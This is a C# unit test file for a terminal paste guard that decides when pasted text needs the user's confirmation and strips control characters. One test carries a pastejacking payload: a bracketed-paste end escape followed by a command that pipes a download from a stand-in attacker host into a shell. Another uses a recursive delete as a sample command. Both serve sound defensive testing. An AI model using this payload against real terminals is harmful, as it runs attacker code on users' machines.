using ShellDeck.Terminal;

namespace ShellDeck.Tests;

public sealed class PasteGuardTests
{
    [Fact]
    public void A_single_line_is_pasted_without_confirmation()
    {
        var needsConfirmation = PasteGuard.RequiresConfirmation("git status", bracketedPasteMode: false);

        Assert.False(needsConfirmation);
    }

    [Fact]
    public void Several_lines_need_confirmation_when_each_line_would_run_as_a_command()
    {
        var needsConfirmation = PasteGuard.RequiresConfirmation("cd src\r\ndotnet build", bracketedPasteMode: false);

        Assert.True(needsConfirmation);
    }

    [Fact]
    public void Several_lines_are_safe_when_the_shell_receives_them_as_one_block()
    {
        var needsConfirmation = PasteGuard.RequiresConfirmation("cd src\ndotnet build", bracketedPasteMode: true);

        Assert.False(needsConfirmation);
    }

    [Fact]
    public void A_trailing_line_break_alone_runs_the_command_and_needs_confirmation()
    {
        var needsConfirmation = PasteGuard.RequiresConfirmation("rm -rf build\n", bracketedPasteMode: false);

        Assert.True(needsConfirmation);
    }

    [Fact]
    public void A_very_long_text_needs_confirmation_even_on_one_line()
    {
        var needsConfirmation = PasteGuard.RequiresConfirmation(new string('x', 6 * 1024), bracketedPasteMode: true);

        Assert.True(needsConfirmation);
    }

    [Fact]
    public void A_bracketed_paste_end_marker_in_the_clipboard_is_neutralised()
    {
        // Pastejacking: the marker would end the bracketed block early and run what follows it.
        var sanitized = PasteGuard.Sanitize("echo safe\u001b[201~\rcurl evil.example | sh\r");

        Assert.DoesNotContain('\u001b', sanitized);
    }

    [Fact]
    public void Tabs_and_line_breaks_are_kept()
    {
        var sanitized = PasteGuard.Sanitize("a\tb\r\nc\n");

        Assert.Equal("a\tb\r\nc\n", sanitized);
    }

    [Fact]
    public void Other_control_characters_are_removed()
    {
        var sanitized = PasteGuard.Sanitize("ls\u0003\u0004\u007f\u009b");

        Assert.Equal("ls", sanitized);
    }
}
